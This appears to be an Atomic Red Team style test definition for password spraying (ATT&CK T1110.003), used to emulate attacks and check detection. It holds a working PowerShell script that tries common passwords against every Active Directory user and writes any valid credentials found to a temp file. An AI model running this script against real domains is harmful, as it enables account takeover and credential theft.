attack_technique: T1110.003
display_name: 'Brute Force: Password Spraying'
atomic_tests:
- name: Password spray
  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
  description: |
    Attempt to brute force all domain users on remote host
  supported_platforms:
  - windows
  input_arguments:
    passwords:
      description: Path to a file containing a list of passwords we will attempt to brute force with
      type: String
      default: Pa`$`$w0rd`n123456`npassword
    domain:
      description: Domain name of the target system we will brute force upon
      type: String
      default: contoso.com
    output_file:
      description: Path to bruteforce output 
      type: Path
      default: C:\Windows\Temp\tmp.txt
  executor:
    name: powershell
    command: |
      $DomainUsers = Get-ADUser -Filter * | Select-Object -Property SamAccountName
      $passwords = "#{passwords}".split("`n")
      $DomainUsers | Foreach-Object {
        foreach ($password in $passwords){
          if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
            "[!] $($_.SamAccountName):$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
          }
        }
      }
      "End of bruteforce" | Out-File -FilePath #{output_file} -Append